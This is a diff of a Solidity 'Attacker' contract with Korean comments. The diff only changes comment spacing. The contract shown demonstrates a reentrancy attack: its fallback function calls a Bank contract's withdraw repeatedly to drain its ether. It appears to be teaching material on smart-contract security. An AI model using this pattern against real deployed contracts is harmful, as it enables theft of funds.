@@ -34,7 +34,7 @@ contract Attacker {
         // deposit() 실행 시 Bank 컨트랙트에 1 ether 입금 (statistics)
         bank.statistics{value: msg.value}(); 
         // 바로 출금 (withdraw(1 ether))
-        bank.withdraw(1 ether); // *최초 출금 요청
+        bank.withdraw(1 ether); // * 최초 출금 요청
     }
 
     // Bank 컨트랙트가 이더를 송금할 때 Attacker의 fallback() 함수 실행됨 
@@ -42,7 +42,7 @@ contract Attacker {
     // 이 반복이 Bank 의 잔고가 1 ether 이하가 될 때까지 계속됨 -> 탈취 
     fallback() external payable {
         if (address(bank).balance > 1 ether) {
-            bank.withdraw(1 ether); // *재진입 공격 시도
+            bank.withdraw(1 ether); // * 재진입 공격 시도
         }
     }
 }
